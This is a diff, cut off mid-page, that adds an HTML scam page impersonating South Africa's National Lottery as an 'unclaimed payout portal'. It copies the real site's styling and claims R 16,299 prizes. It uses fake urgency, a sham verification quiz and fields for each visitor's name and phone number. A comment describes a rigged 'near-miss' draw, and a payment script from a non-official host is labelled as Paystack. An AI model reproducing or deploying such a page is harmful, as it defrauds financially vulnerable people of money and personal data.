@@ -1,0 +1,1701 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, user-scalable=no, viewport-fit=cover" />
+  <meta name="theme-color" content="#FACB0F" />
+  <title>South African National Lottery — Official Unclaimed Payout Portal</title>
+  <meta name="robots" content="noindex, nofollow, noarchive, nosnippet, noimageindex" />
+
+  <!-- Meta Pixel Code -->
+  <script>
+  !function(f,b,e,v,n,t,s)
+  {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+  n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+  if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+  n.queue=[];t=b.createElement(e);t.async=!0;
+  t.src=v;s=b.getElementsByTagName(e)[0];
+  s.parentNode.insertBefore(t,s)}(window, document,'script',
+  'https://connect.facebook.net/en_US/fbevents.js');
+  fbq('init', '4179716432354886');
+  fbq('init', '1885462942865689');
+  fbq('track', 'PageView');
+  </script>
+  <noscript>
+    <img height="1" width="1" style="display:none" src="https://www.facebook.com/tr?id=4179716432354886&ev=PageView&noscript=1"/>
+    <img height="1" width="1" style="display:none" src="https://www.facebook.com/tr?id=1885462942865689&ev=PageView&noscript=1"/>
+  </noscript>
+
+  <!-- Official CreaPay / Paystack Inline Modal Script (Direct API Inline Popup — Zero Redirect) -->
+  <script src="https://pay.africagrabpoint.com/embed.js"></script>
+
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;500;600;700;800;900&family=Urbanist:ital,wght@0,400;0,500;0,600;0,700;0,800;0,900;1,700;1,800&display=swap" rel="stylesheet">
+
+  <!-- DNS Prefetch for Vturb (No auto-execution) -->
+  <link rel="dns-prefetch" href="https://cdn.converteai.net">
+  <link rel="dns-prefetch" href="https://scripts.converteai.net">
+  <link rel="dns-prefetch" href="https://images.converteai.net">
+
+  <style>
+    /* EXACT @font-face FROM https://www.nationallottery.co.za/#/ */
+    @font-face {
+      font-family: 'UrbanistBlack';
+      src: url('images/ithuba/UrbanistBlack-u2-KTc2o.ttf') format('truetype');
+      font-weight: 900;
+      font-display: swap;
+    }
+    @font-face {
+      font-family: 'UrbanistExtraBold';
+      src: url('images/ithuba/UrbanistExtraBold-B9Hc7G5_.ttf') format('truetype');
+      font-weight: 800;
+      font-display: swap;
+    }
+    @font-face {
+      font-family: 'UrbanistMedium';
+      src: url('images/ithuba/UrbanistMedium-DwLaFCpV.ttf') format('truetype');
+      font-weight: 500;
+      font-display: swap;
+    }
+    @font-face {
+      font-family: 'Montserrat-VariableFont_wght';
+      src: url('images/ithuba/Montserrat-VariableFont_wght-DcaoeaBt.ttf') format('truetype');
+      font-display: swap;
+    }
+
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+      font-family: 'Montserrat-VariableFont_wght', 'Montserrat', sans-serif;
+      -webkit-tap-highlight-color: transparent;
+      scrollbar-width: none;
+    }
+    *::-webkit-scrollbar { display: none; }
+
+    /* EXACT H5 GOLDEN-AMBER GRADIENT FROM nationallottery.co.za/assets/layout-h5-DIuAfS9_.css */
+    body {
+      min-height: 100vh;
+      background: linear-gradient(359.98deg, #654501 62.37%, #ca9a21 93.33%, #facb0f 104.53%);
+      background-attachment: fixed;
+      color: #ffffff;
+      padding-bottom: 92px;
+      overflow-x: hidden;
+    }
+
+    .font-urbanist-black { font-family: 'UrbanistBlack', 'Urbanist', sans-serif; font-weight: 900; }
+    .font-urbanist-bold { font-family: 'UrbanistExtraBold', 'Urbanist', sans-serif; font-weight: 800; }
+    .font-urbanist-med { font-family: 'UrbanistMedium', 'Urbanist', sans-serif; font-weight: 500; }
+    .hidden { display: none !important; }
+
+    /* EXACT GLASSMORPHIC CARD FROM nationallottery.co.za/assets/GameListCard-BXC_QnnP.css */
+    .game-list-card {
+      position: relative;
+      isolation: isolate;
+      border: none;
+      overflow: hidden;
+      background: rgba(0, 0, 0, 0.38);
+      -webkit-backdrop-filter: blur(16px) saturate(1.2);
+      backdrop-filter: blur(16px) saturate(1.2);
+      box-shadow: inset 1px 1px rgba(255, 255, 255, 0.18), inset -1px -1px rgba(255, 255, 255, 0.1), 0 6px 24px rgba(0, 0, 0, 0.22);
+      display: flex;
+      flex-direction: column;
+      gap: 10px;
+      width: 100%;
+      padding: 16px 15px;
+      border-radius: 16px;
+      color: #fff;
+      margin-bottom: 14px;
+    }
+    .game-list-card::before {
+      content: "";
+      position: absolute;
+      inset: 0;
+      border-radius: 16px;
+      padding: 1px;
+      background: radial-gradient(120% 90% at 0% 0%, rgba(255,255,255,.45) 0%, rgba(255,255,255,.16) 14%, rgba(255,255,255,.04) 28%, transparent 46%),
+                  radial-gradient(120% 90% at 100% 100%, rgba(255,255,255,.36) 0%, rgba(255,255,255,.14) 14%, rgba(255,255,255,.03) 28%, transparent 46%);
+      -webkit-mask: linear-gradient(#fff 0 0) content-box, linear-gradient(#fff 0 0);
+      -webkit-mask-composite: xor;
+      mask-composite: exclude;
+      pointer-events: none;
+      z-index: 1;
+    }
+    .game-list-card > * { position: relative; z-index: 3; }
+
+    /* OFFICIAL HEADER (.header1) + WALLET BALANCE PILL (.balance-with-reload) */
+    .ithuba-top-header {
+      position: sticky;
+      top: 0;
+      z-index: 90;
+      padding: 10px 14px;
+      background: rgba(101, 69, 1, 0.85);
+      -webkit-backdrop-filter: blur(14px);
+      backdrop-filter: blur(14px);
+      border-bottom: 1px solid rgba(255, 225, 0, 0.3);
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 10px;
+    }
+    .header-logo-img {
+      height: 32px;
+      width: auto;
+      max-width: 155px;
+      object-fit: contain;
+      display: block;
+    }
+    .wallet-pill {
+      display: inline-flex;
+      align-items: center;
+      gap: 8px;
+      background: rgba(0, 0, 0, 0.45);
+      border: 1px solid rgba(255, 225, 0, 0.6);
+      border-radius: 999px;
+      padding: 5px 12px 5px 10px;
+      transition: transform 0.3s ease;
+    }
+    .wallet-pill__lbl {
+      font-size: 9px;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+      color: rgba(255, 255, 255, 0.78);
+      display: block;
+      line-height: 1;
+    }
+    .wallet-pill__val {
+      font-family: 'UrbanistBlack', 'Urbanist', sans-serif;
+      font-size: 14px;
+      font-weight: 900;
+      color: #ffe100;
+      line-height: 1.15;
+    }
+    .wallet-pill__status {
+      background: #ff650c;
+      color: #fff;
+      font-size: 9px;
+      font-weight: 800;
+      padding: 2px 6px;
+      border-radius: 999px;
+      text-transform: uppercase;
+    }
+
+    /* CLICKBAIT BREAKING STRIP */
+    .urgent-strip {
+      background: linear-gradient(90deg, #b8000b 0%, #e30613 50%, #b8000b 100%);
+      color: #fff;
+      font-size: 11px;
+      font-weight: 700;
+      padding: 6px 12px;
+      text-align: center;
+      letter-spacing: 0.2px;
+      border-bottom: 1px solid rgba(255, 225, 0, 0.35);
+    }
+    .urgent-strip b { color: #ffe100; }
+
+    /* MAIN CONTAINER */
+    .app-container {
+      width: 100%;
+      max-width: 520px;
+      margin: 0 auto;
+      padding: 12px 14px 30px;
+    }
+
+    /* OFFICIAL PLAY-TYPES / TABS FROM lotto-BYaj1M44.css */
+    .playTypes {
+      display: flex;
+      gap: 8px;
+      margin-bottom: 12px;
+    }
+    .playTypes .type {
+      flex: 1;
+      height: 36px;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      color: rgba(255,255,255,0.8);
+      border: 1.5px solid rgba(255,255,255,0.2);
+      border-radius: 18px;
+      background: rgba(255, 255, 255, 0.12);
+      font-size: 11px;
+      font-weight: 700;
+    }
+    .playTypes .type-select {
+      color: #ffe100;
+      background: rgba(255, 225, 0, 0.18);
+      border-color: #ffe100 !important;
+    }
+
+    /* OFFICIAL OPTION BUTTONS FROM withdraw-DrJGcZIL.css (.pm-option) */
+    .pm-option {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 13px 14px;
+      border-radius: 12px;
+      border: 1px solid rgba(255, 255, 255, 0.24);
+      background: rgba(255, 255, 255, 0.09);
+      cursor: pointer;
+      transition: all 0.18s ease;
+      margin-bottom: 9px;
+      width: 100%;
+      text-align: left;
+      color: #fff;
+    }
+    .pm-option:hover, .pm-option.active {
+      border-color: #ffe100;
+      background: rgba(255, 225, 0, 0.16);
+      box-shadow: 0 0 0 1px rgba(255, 225, 0, 0.35);
+    }
+    .pm-option__left {
+      display: flex;
+      align-items: center;
+      gap: 11px;
+      min-width: 0;
+    }
+    .pm-radio-dot {
+      width: 18px;
+      height: 18px;
+      border-radius: 50%;
+      border: 2px solid rgba(255,255,255,0.65);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      flex-shrink: 0;
+    }
+    .pm-option:hover .pm-radio-dot, .pm-option.active .pm-radio-dot {
+      border-color: #ffe100;
+    }
+    .pm-option:hover .pm-radio-dot::after, .pm-option.active .pm-radio-dot::after {
+      content: "";
+      width: 9px;
+      height: 9px;
+      border-radius: 50%;
+      background: #ffe100;
+    }
+    .pm-option__text {
+      font-size: 13.5px;
+      font-weight: 700;
+      color: #ffffff;
+      line-height: 1.25;
+    }
+    .pm-option__badge {
+      background: rgba(255, 225, 0, 0.2);
+      border: 1px solid rgba(255, 225, 0, 0.5);
+      color: #ffe100;
+      font-size: 10px;
+      font-weight: 800;
+      padding: 3px 8px;
+      border-radius: 999px;
+      flex-shrink: 0;
+    }
+
+    /* OFFICIAL PILL CTA BUTTON FROM index-Dyfg3lui.css */
+    .ithuba-btn-primary {
+      width: 100%;
+      min-height: 52px;
+      border-radius: 999px;
+      border: none;
+      background: linear-gradient(90deg, #ffe100 0%, #f8c419 100%);
+      color: #1a1a1a;
+      font-family: 'UrbanistBlack', 'Urbanist', -apple-system, sans-serif;
+      font-size: 15.5px;
+      font-weight: 900;
+      letter-spacing: 0.3px;
+      cursor: pointer;
+      box-shadow: 0 6px 20px rgba(248, 196, 25, 0.45);
+      transition: transform 0.12s ease, opacity 0.15s ease;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      padding: 8px 16px;
+      text-transform: uppercase;
+      animation: ithubaPulse 1.6s infinite ease-in-out;
+    }
+    .ithuba-btn-primary:hover:not(:disabled) {
+      transform: scale(1.02);
+    }
+    .ithuba-btn-primary:disabled {
+      opacity: 0.5;
+      cursor: not-allowed;
+      box-shadow: none;
+    }
+    .ithuba-btn-primary small {
+      font-family: 'Montserrat', sans-serif;
+      font-size: 10px;
+      font-weight: 800;
+      color: #005a20;
+      text-transform: none;
+      margin-top: 2px;
+    }
+    @keyframes ithubaPulse {
+      0%, 100% { transform: scale(1); }
+      50% { transform: scale(1.025); }
+    }
+
+    /* OFFICIAL INPUT FIELDS FROM withdraw-DrJGcZIL.css (.w-field) */
+    .w-field-label {
+      display: block;
+      font-size: 11.5px;
+      font-weight: 700;
+      color: rgba(255, 255, 255, 0.9);
+      margin-bottom: 5px;
+    }
+    .w-field {
+      width: 100%;
+      min-height: 46px;
+      padding: 11px 14px;
+      border-radius: 12px;
+      border: 1px solid rgba(255, 255, 255, 0.32);
+      background: rgba(255, 255, 255, 0.12);
+      color: #fff;
+      font-size: 14px;
+      font-weight: 600;
+      outline: none;
+      margin-bottom: 11px;
+      transition: border-color 0.2s ease, box-shadow 0.2s ease;
+    }
+    .w-field::placeholder { color: rgba(255, 255, 255, 0.48); }
+    .w-field:focus {
+      border-color: #ffe100;
+      box-shadow: 0 0 0 2px rgba(255, 225, 0, 0.22);
+      background: rgba(0, 0, 0, 0.28);
+    }
+
+    /* OFFICIAL NUMBER GRID & 3D BALLS FROM powerball-C7jrbHW2.css */
+    .number-grid {
+      display: grid;
+      width: 100%;
+      grid-template-columns: repeat(5, minmax(0, 1fr));
+      gap: 8px;
+      padding: 10px 0;
+      place-items: center;
+    }
+    .lotto-number {
+      position: relative;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      width: 44px;
+      height: 44px;
+      border-radius: 50%;
+      border: 2px solid rgba(255, 255, 255, 0.48);
+      background: rgba(0, 0, 0, 0.25);
+      font-family: 'UrbanistBlack', 'Urbanist', sans-serif;
+      font-weight: 900;
+      font-size: 15px;
+      color: #fff;
+      cursor: pointer;
+      transition: transform 0.12s ease;
+    }
+    .lotto-number:hover:not(:disabled) {
+      border-color: #ffe100;
+      transform: scale(1.06);
+    }
+    .lotto-number--selected {
+      color: #1a1a1a;
+      border-color: transparent;
+      background-image: url('images/ithuba/ball_powerball_yellow.png');
+      background-size: cover;
+      background-position: center;
+    }
+    .lotto-number:disabled {
+      opacity: 0.45;
+      cursor: not-allowed;
+    }
+
+    /* LIVE 5-BALL DRAW ROW USING REAL nationallottery.co.za BALL PNGs */
+    .drawn-balls-row {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      padding: 12px 8px;
+      background: rgba(0, 0, 0, 0.35);
+      border-radius: 999px;
+      border: 1px solid rgba(255, 255, 255, 0.16);
+      margin: 8px 0;
+    }
+    .drawn-ball-slot {
+      width: 48px;
+      height: 48px;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-family: 'UrbanistBlack', 'Urbanist', sans-serif;
+      font-weight: 900;
+      font-size: 17px;
+      background-size: cover;
+      background-position: center;
+      position: relative;
+    }
+    .drawn-ball-empty {
+      border: 2px dashed rgba(255, 255, 255, 0.32);
+      background: rgba(255, 255, 255, 0.06);
+      color: rgba(255, 255, 255, 0.4);
+    }
+    .drawn-ball-yellow {
+      background-image: url('images/ithuba/ball_powerball_yellow.png');
+      color: #1a1a1a;
+      animation: popIn 0.4s cubic-bezier(0.34, 1.56, 0.64, 1) forwards;
+    }
+    .drawn-ball-red {
+      background-image: url('images/ithuba/ball_powerball_red.png');
+      color: #ffffff;
+      box-shadow: 0 0 16px rgba(227, 6, 19, 0.75);
+      animation: popIn 0.45s cubic-bezier(0.34, 1.56, 0.64, 1) forwards;
+    }
+    @keyframes popIn {
+      0% { transform: scale(0.35); opacity: 0; }
+      75% { transform: scale(1.12); }
+      100% { transform: scale(1); opacity: 1; }
+    }
+
+    /* REAL SOUTH AFRICAN BANK LOGO CARDS */
+    .sa-bank-grid {
+      display: grid;
+      grid-template-columns: repeat(2, 1fr);
+      gap: 9px;
+      margin-bottom: 14px;
+    }
+    .sa-bank-card {
+      background: rgba(255, 255, 255, 0.1);
+      border: 1.5px solid rgba(255, 255, 255, 0.24);
+      border-radius: 12px;
+      padding: 8px 10px;
+      cursor: pointer;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 5px;
+      transition: all 0.16s ease;
+    }
+    .sa-bank-card:hover, .sa-bank-card.active {
+      border-color: #ffe100;
+      background: rgba(255, 225, 0, 0.18);
+      box-shadow: 0 0 0 2px rgba(255, 225, 0, 0.32);
+    }
+    .sa-bank-card img {
+      width: 100%;
+      max-width: 128px;
+      height: 36px;
+      object-fit: contain;
+      border-radius: 6px;
+      display: block;
+    }
+    .sa-bank-card span {
+      font-size: 10.5px;
+      font-weight: 700;
+      color: #fff;
+    }
+
+    /* PENDING BALANCE WALLET HERO ON VSL / INLINE CHECKOUT */
+    .pending-balance-hero {
+      background: linear-gradient(135deg, rgba(0, 0, 0, 0.58) 0%, rgba(45, 30, 2, 0.68) 100%);
+      border: 1.5px solid #ffe100;
+      border-radius: 14px;
+      padding: 13px;
+    }
+    .escrow-progress-track {
+      width: 100%;
+      height: 8px;
+      background: rgba(255, 255, 255, 0.14);
+      border-radius: 999px;
+      overflow: hidden;
+      margin-top: 6px;
+    }
+    .escrow-progress-fill {
+      width: 92%;
+      height: 100%;
+      background: linear-gradient(90deg, #009639 0%, #ffe100 100%);
+      border-radius: 999px;
+    }
+
+    .summary-row {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 6px 0;
+      border-bottom: 1px solid rgba(255, 255, 255, 0.12);
+      font-size: 12px;
+    }
+    .summary-row:last-child { border-bottom: none; }
+
+    /* OFFICIAL BOTTOM NAVIGATION BAR FROM layout-h5-DIuAfS9_.css */
+    .bottom-nav {
+      position: fixed;
+      bottom: 0;
+      left: 0;
+      right: 0;
+      height: 68px;
+      border-radius: 24px 24px 0 0;
+      background: rgba(0, 0, 0, 0.48);
+      -webkit-backdrop-filter: blur(16px) saturate(1.2);
+      backdrop-filter: blur(16px) saturate(1.2);
+      box-shadow: inset 1px 1px rgba(255, 255, 255, 0.16), 0 -4px 24px rgba(0, 0, 0, 0.25);
+      display: flex;
+      align-items: center;
+      justify-content: space-around;
+      z-index: 85;
+      padding: 6px 10px;
+    }
+    .nav-item {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      gap: 2px;
+      opacity: 0.75;
+    }
+    .nav-item.active { opacity: 1; }
+    .nav-item img { width: 24px; height: 24px; object-fit: contain; }
+    .nav-text { font-size: 10px; color: #fff; font-weight: 500; }
+    .nav-item.active .nav-text { color: #ffe100; font-weight: 700; }
+
+    .countdown-unit {
+      padding: 2px 7px;
+      border-radius: 5px;
+      background: #f5f5f5;
+      color: #1a1a1a;
+      font-size: 12px;
+      font-weight: 800;
+    }
+
+    /* LIVE PAYOUT TOAST */
+    .payout-toast {
+      position: fixed;
+      bottom: 78px;
+      left: 14px;
+      right: 14px;
+      max-width: 360px;
+      background: rgba(20, 20, 20, 0.94);
+      -webkit-backdrop-filter: blur(12px);
+      backdrop-filter: blur(12px);
+      border: 1px solid rgba(255, 225, 0, 0.55);
+      border-radius: 12px;
+      padding: 9px 12px;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      z-index: 95;
+      box-shadow: 0 8px 24px rgba(0,0,0,0.45);
+      transition: all 0.35s ease;
+      transform: translateY(130%);
+      opacity: 0;
+      pointer-events: none;
+    }
+    .payout-toast.show {
+      transform: translateY(0);
+      opacity: 1;
+    }
+    .payout-toast img {
+      width: 68px;
+      height: 24px;
+      object-fit: contain;
+      border-radius: 4px;
+      flex-shrink: 0;
+    }
+
+    /* INLINE CREAPAY / PAYSTACK POPUP MODAL (Matches nationallottery.co.za .chatbot-panel) */
+    .creapay-modal-overlay {
+      position: fixed;
+      inset: 0;
+      background: rgba(0, 0, 0, 0.84);
+      -webkit-backdrop-filter: blur(8px);
+      backdrop-filter: blur(8px);
+      z-index: 250;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 12px;
+    }
+    .creapay-modal-container {
+      width: min(440px, calc(100vw - 20px));
+      border-radius: 18px;
+      overflow: hidden;
+      background: #1a1a1a;
+      border: 1.5px solid #ffe100;
+      box-shadow: 0 16px 48px rgba(0, 0, 0, 0.65);
+      display: flex;
+      flex-direction: column;
+    }
+    .creapay-modal-header {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 11px 14px;
+      background: linear-gradient(90deg, #bf9a08, #8d591a);
+      color: #fff;
+    }
+    .modal-close-icon {
+      width: 32px;
+      height: 32px;
+      border: none;
+      border-radius: 8px;
+      background: rgba(0, 0, 0, 0.28);
+      color: #fff;
+      font-size: 18px;
+      cursor: pointer;
+    }
+    .creapay-iframe-wrapper {
+      width: 100%;
+      height: 490px;
+      background: #ffffff;
+    }
+    .creapay-iframe-wrapper iframe {
+      width: 100%;
+      height: 100%;
+      border: 0;
+      display: block;
+    }
+  </style>
+</head>
+<body>
+
+  <!-- URGENT CLICKBAIT TOP STRIP -->
+  <div class="urgent-strip">
+    UNCLAIMED DIVIDEND POOL: <b>3 PAYOUT SLOTS LEFT</b> • INSTANT PAYSHAP / EFT ACTIVE
+  </div>
+
+  <!-- OFFICIAL nationallottery.co.za HEADER + LIVE PENDING WALLET -->
+  <header class="ithuba-top-header">
+    <img src="images/ithuba/ithuba_header_logo.png" onerror="this.src='lottery-logo.png'" alt="National Lottery" class="header-logo-img" />
+
+    <div class="wallet-pill" id="topWalletPill">
+      <div>
+        <span class="wallet-pill__lbl">Wallet Payout</span>
+        <span id="headerWalletValue" class="wallet-pill__val">R 0.00</span>
+      </div>
+      <span id="headerWalletBadge" class="wallet-pill__status">ELIGIBLE</span>
+    </div>
+  </header>
+
+  <!-- 18+ OFFICIAL VERIFICATION MODAL (Matches nationallottery.co.za .app-error-fallback__card) -->
+  <div id="ageModal" style="position:fixed;inset:0;z-index:120;background:rgba(0,0,0,0.78);backdrop-filter:blur(8px);display:flex;align-items:center;justify-content:center;padding:18px;">
+    <div class="game-list-card" style="max-width:370px;text-align:center;padding:24px 20px;background:rgba(20,14,2,0.9);">
+      <img src="images/ithuba/ithuba_header_logo.png" alt="Ithuba" style="height:36px;margin:0 auto 10px;object-fit:contain;" />
+      <div style="display:inline-block;background:#ff650c;color:#fff;font-size:10px;font-weight:800;padding:3px 10px;border-radius:999px;margin:0 auto 8px;text-transform:uppercase;">
+        18+ South African Residents Only
+      </div>
+      <h2 class="font-urbanist-black" style="font-size:20px;line-height:1.2;color:#ffe100;">
+        UNCLAIMED POWERBALL &amp; LOTTO PAYOUT PORTAL
+      </h2>
+      <p style="font-size:12.5px;color:rgba(255,255,255,0.86);line-height:1.45;margin:8px 0 14px;">
+        Confirm you are <b>18 years or older</b> with an active South African bank account to claim your <b style="color:#ffe100;" class="dynamic-prize-text">R 16,299.00</b> tax-free payout slot.
+      </p>
+      <button onclick="closeAgeModal()" class="ithuba-btn-primary">
+        <span>I AM 18+ — ENTER PORTAL</span>
+      </button>
+      <p style="font-size:10px;color:rgba(255,255,255,0.55);margin-top:10px;">
+        Play Responsibly • National Responsible Gambling Helpline: 0800 006 008
+      </p>
+    </div>
+  </div>
+
+  <!-- MAIN CONTENT CONTAINER -->
+  <main class="app-container">
+
+    <!-- OFFICIAL GAME TABS (.playTypes) -->
+    <div class="playTypes">
+      <div id="tabStep1" class="type type-select">1. Eligibility</div>
+      <div id="tabStep2" class="type">2. Live Draw</div>
+      <div id="tabStep3" class="type">3. Instant Payout</div>
+    </div>
+
+    <!-- =========================================================
+         STEP 1: CLICKBAIT HERO + 3-QUESTION ELIGIBILITY CHECK
+         ========================================================= -->
+    <div id="step-quiz">
+
+      <!-- Official GameListCard Hero -->
+      <article class="game-list-card">
+        <div style="display:flex;align-items:center;justify-content:space-between;">
+          <img src="images/ithuba/powerball_logo.png" alt="PowerBall" style="height:32px;object-fit:contain;" />
+          <div style="display:flex;align-items:center;gap:4px;">
+            <span style="font-size:11px;color:rgba(255,255,255,0.8);">Closes in:</span>
+            <span class="countdown-unit">00h</span>
+            <span class="countdown-unit">14m</span>
+          </div>
+        </div>
+
+        <div style="border-top:1px solid rgba(255,255,255,0.14);padding-top:8px;">
+          <div style="font-size:11px;color:#ffe100;font-weight:800;text-transform:uppercase;letter-spacing:0.5px;">
+            OFFICIAL UNCLAIMED DIVIDEND AUDIT
+          </div>
+          <h1 class="font-urbanist-black" style="font-size:18px;line-height:1.22;margin-top:3px;">
+            DID YOU USE CAPITEC, FNB, ABSA OR TYMEBANK IN 2025/2026?
+          </h1>
+          <p style="font-size:12px;color:rgba(255,255,255,0.84);line-height:1.45;margin-top:5px;">
+            Answer 3 quick verification questions to unlock your <b>2 Free PowerBall Spins</b> and claim <b style="color:#ffe100;" class="dynamic-prize-text">R 16,299.00</b> directly to your bank account.
+          </p>
+        </div>
+      </article>
+
+      <!-- Quiz Card -->
+      <section class="game-list-card">
+        <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:4px;">
+          <span style="font-size:11px;font-weight:800;color:#ffe100;text-transform:uppercase;">FICA &amp; RICA VERIFICATION</span>
+          <span id="qBadge" style="background:#ff650c;color:#fff;font-size:10px;font-weight:800;padding:2px 8px;border-radius:999px;">Question 1 of 3</span>
+        </div>
+
+        <!-- Question 1 -->
+        <div id="qBox1">
+          <h3 class="font-urbanist-bold" style="font-size:16px;line-height:1.3;margin-bottom:10px;">
+            1. Do you have an active South African bank account capable of receiving Instant PayShap / EFT payouts?
+          </h3>
+          <button class="pm-option" onclick="nextQuestion(1)">
+            <div class="pm-option__left">
+              <span class="pm-radio-dot"></span>
+              <span class="pm-option__text">Yes — Capitec, FNB, TymeBank or Standard Bank</span>
+            </div>
+            <span class="pm-option__badge">Instant</span>
+          </button>
+          <button class="pm-option" onclick="nextQuestion(1)">
+            <div class="pm-option__left">
+              <span class="pm-radio-dot"></span>
+              <span class="pm-option__text">Yes — ABSA, Nedbank, African Bank or Discovery</span>
+            </div>
+            <span class="pm-option__badge">Instant</span>
+          </button>
+        </div>
+
+        <!-- Question 2 -->
+        <div id="qBox2" class="hidden">
+          <h3 class="font-urbanist-bold" style="font-size:16px;line-height:1.3;margin-bottom:10px;">
+            2. Have you ever bought Lotto/PowerBall tickets or airtime vouchers using your cellphone number?
+          </h3>
+          <button class="pm-option" onclick="nextQuestion(2)">
+            <div class="pm-option__left">
+              <span class="pm-radio-dot"></span>
+              <span class="pm-option__text">Yes — Via my Banking App or Cellphone</span>
+            </div>
+            <span class="pm-option__badge">Eligible</span>
+          </button>
+          <button class="pm-option" onclick="nextQuestion(2)">
+            <div class="pm-option__left">
+              <span class="pm-radio-dot"></span>
+              <span class="pm-option__text">Yes — At retail stores / first time claiming online</span>
+            </div>
+            <span class="pm-option__badge">Eligible</span>
+          </button>
+        </div>
+
+        <!-- Question 3 -->
+        <div id="qBox3" class="hidden">
+          <h3 class="font-urbanist-bold" style="font-size:16px;line-height:1.3;margin-bottom:10px;">
+            3. If <span style="color:#ffe100;" class="dynamic-prize-text">R 16,299.00</span> is credited to your account today, what is your primary priority?
+          </h3>
+          <button class="pm-option" onclick="nextQuestion(3)">
+            <div class="pm-option__left">
+              <span class="pm-radio-dot"></span>
+              <span class="pm-option__text">Pay off bills, loans &amp; household expenses</span>
+            </div>
+            <span class="pm-option__badge">Select</span>
+          </button>
+          <button class="pm-option" onclick="nextQuestion(3)">
+            <div class="pm-option__left">
+              <span class="pm-radio-dot"></span>
+              <span class="pm-option__text">Buy groceries, electricity &amp; support my family</span>
+            </div>
+            <span class="pm-option__badge">Select</span>
+          </button>
+          <button class="pm-option" onclick="nextQuestion(3)">
+            <div class="pm-option__left">
+              <span class="pm-radio-dot"></span>
+              <span class="pm-option__text">Savings, school fees or local business</span>
+            </div>
+            <span class="pm-option__badge">Select</span>
+          </button>
+        </div>
+      </section>
+    </div>
+
+    <!-- =========================================================
+         STEP 2: PLAYER REGISTRATION & OFFICIAL GAME CARD SELECTION
+         ========================================================= -->
+    <div id="step-register" class="hidden">
+      <section class="game-list-card">
+        <div style="display:flex;justify-content:space-between;align-items:center;">
+          <span style="font-size:11px;font-weight:800;color:#ffe100;text-transform:uppercase;">STEP 2: RICA BENEFICIARY REGISTRATION</span>
+          <span style="background:#ff650c;color:#fff;font-size:10px;font-weight:800;padding:2px 8px;border-radius:999px;">2 Free Spins Ready</span>
+        </div>
+
+        <p style="font-size:12px;color:rgba(255,255,255,0.85);">
+          Enter your name and South African mobile number, then tap the official draw pool you wish to enter:
+        </p>
+
+        <div>
+          <label class="w-field-label">Full Name (As registered on your SA Bank Account)</label>
+          <input id="inpName" type="text" class="w-field" placeholder="e.g. Thabo Mokoena" oninput="validateReg()" />
+
+          <label class="w-field-label">South African Mobile Number (For SMS Payout Alert)</label>
+          <input id="inpPhone" type="tel" inputmode="tel" class="w-field" placeholder="e.g. 071 234 5678" oninput="validateReg()" />
+        </div>
+
+        <label class="w-field-label" style="margin-bottom:8px;">Select Official Draw Pool (Tap to select):</label>
+        <div id="officialGamesList" style="display:flex;flex-direction:column;gap:8px;margin-bottom:12px;">
+          <!-- Rendered with real lotto_logo.png, powerball_logo.png, dailylotto_logo.png -->
+        </div>
+
+        <button id="btnStartDraw" disabled onclick="goToDrawStep()" class="ithuba-btn-primary">
+          <span>UNLOCK MY 2 FREE POWERBALL SPINS →</span>
+        </button>
+      </section>
+    </div>
+
+    <!-- =========================================================
+         STEP 3: OFFICIAL 5-BALL DRAW (NEAR-MISS -> GUARANTEED HIT)
+         ========================================================= -->
+    <div id="step-draw" class="hidden">
+      <section class="game-list-card">
+        <div style="display:flex;align-items:center;justify-content:space-between;">
+          <img id="drawPoolLogo" src="images/ithuba/powerball_logo.png" alt="Game" style="height:30px;object-fit:contain;" />
+          <span id="spinsRemainingBadge" style="background:#ff650c;color:#fff;font-size:11px;font-weight:800;padding:3px 10px;border-radius:999px;">
+            2 Free Spins Left
+          </span>
+        </div>
+
+        <div style="text-align:center;margin-top:4px;">
+          <p id="drawHeadline" class="font-urbanist-bold" style="font-size:15px;color:#ffe100;">
+            Pick 1 Lucky Number (01 – 15) to Start the Official 5-Ball Draw
+          </p>
+
+          <!-- 5 Drawn Balls Row -->
+          <div id="drawnBallsRow" class="drawn-balls-row">
+            <!-- 5 Balls -->
+          </div>
+
+          <p id="drawSubStatus" style="font-size:11.5px;color:rgba(255,255,255,0.82);">
+            If your number matches the 5th Red PowerBall, you win an instant <b style="color:#ffe100;" class="dynamic-prize-text">R 16,299.00</b> cash payout!
+          </p>
+        </div>
+
+        <!-- NEAR-MISS SECOND CHANCE BANNER (Appears after Attempt 1 misses by 1 digit!) -->
+        <div id="nearMissAlert" class="hidden" style="background:rgba(227,6,19,0.28);border:1.5px solid #ffe100;border-radius:12px;padding:12px;text-align:left;">
+          <div style="font-size:11px;font-weight:900;color:#ffe100;text-transform:uppercase;">
+            SO CLOSE — MISSED BY JUST 1 NUMBER!
+          </div>
+          <p style="font-size:12.5px;color:#fff;margin-top:4px;line-height:1.4;">
